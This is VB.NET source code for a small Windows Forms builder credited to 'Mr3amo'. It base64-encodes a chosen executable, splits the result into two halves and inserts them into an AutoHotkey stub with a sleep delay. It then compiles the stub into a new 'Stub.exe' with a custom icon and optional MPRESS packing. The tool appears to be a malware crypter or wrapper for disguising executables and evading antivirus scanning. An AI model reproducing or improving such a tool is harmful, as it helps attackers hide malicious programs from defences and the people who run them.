Imports System.IO
Imports System.Text
Imports System.Threading
Public Class Form1
    '==========================================
    '========= coded by : Mr3amo ==============
    '==========================================
    Dim ss, strico As String
    Dim firststr, secondstr As String
    Dim strLen As Long
    Private Sub FlatButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton1.Click
        Dim cd As New OpenFileDialog
        Dim th As Thread
        cd.FileName = ""
        cd.Filter = "Execut|*.exe"
        If cd.ShowDialog = Windows.Forms.DialogResult.OK Then
            FlatTextBox1.Text = ""

            FlatTextBox1.Text = cd.FileName
            th = New Thread(AddressOf conv)
            th.Start()

        Else

            FlatTextBox1.Text = "Select file"

        End If

    End Sub
    Public autpath As String = Application.StartupPath & "\Compile\Ahk2Exe.exe"
    Sub compile(ByVal out As String)
        Dim stb As String = My.Resources.stub
        stb = stb.Replace("<server>", firststr)
        stb = stb.Replace("<server1>", secondstr)
        stb = stb.Replace("<sleep>", FlatTextBox3.Text)
        If FlatTextBox3.Text = "" Then FlatTextBox3.Text = "4000"
        If FlatTextBox2.Text = "" Then
            strico = Application.StartupPath & "\Compile\Icon_1.ico"
        End If
        IO.File.WriteAllText(Application.StartupPath & "\Compile\stub.ahk", stb)
        Dim pro As New ProcessStartInfo
        pro.FileName = autpath
        If FlatCheckBox1.Checked = True Then
            pro.Arguments = " /in " & ChrW(34) & Application.StartupPath & "\Compile\stub.ahk" & ChrW(34) & " /out " & ChrW(34) & out & ChrW(34) & " /icon " & ChrW(34) & strico & ChrW(34) & " /bin " & ChrW(34) & Application.StartupPath & "\Compile\Unicode 32-bit.bin" & ChrW(34) & " /mpress 1 "
        Else
            pro.Arguments = " /in " & ChrW(34) & Application.StartupPath & "\Compile\stub.ahk" & ChrW(34) & " /out " & ChrW(34) & out & ChrW(34) & " /icon " & ChrW(34) & strico & ChrW(34) & " /bin " & ChrW(34) & Application.StartupPath & "\Compile\Unicode 32-bit.bin" & ChrW(34) & " /mpress 0 "

        End If
        Process.Start(pro).WaitForExit()
        File.Delete(Application.StartupPath & "\Compile\stub.ahk")
        MsgBox(out, , "Done! :)")
    End Sub
    Sub conv()

        Dim BinBytes As Byte() = System.IO.File.ReadAllBytes(FlatTextBox1.Text)
        ss = Convert.ToBase64String(BinBytes)
        strLen = ss.Length / 2
        firststr = ss.Substring(0, strLen)
        secondstr = ss.Substring(strLen, ss.Length - strLen)
    End Sub
    Private Sub FlatButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton3.Click
        Dim cd As New SaveFileDialog
        If FlatTextBox2.Text = "" Then
            MsgBox("Select file :)", , Me.Text)
            Exit Sub
        Else
            cd.FileName = "Stub.exe"
            cd.Filter = "|*.exe"
            If cd.ShowDialog = Windows.Forms.DialogResult.OK Then
                compile(cd.FileName)
            End If
        End If
    End Sub


    Private Sub FlatButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton2.Click
        MsgBox("Coded By : Mr3amo", , "About")
    End Sub

    Private Sub FlatButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton4.Click
        Dim cd As New OpenFileDialog

        cd.FileName = ""
        cd.Filter = "Icones|*.ico"
        If cd.ShowDialog = Windows.Forms.DialogResult.OK Then
            FlatTextBox2.Text = ""

            FlatTextBox2.Text = cd.FileName
            strico = cd.FileName

        Else

            strico = Application.StartupPath & "\Compile\Icon_1.ico"

        End If
    End Sub


End Class
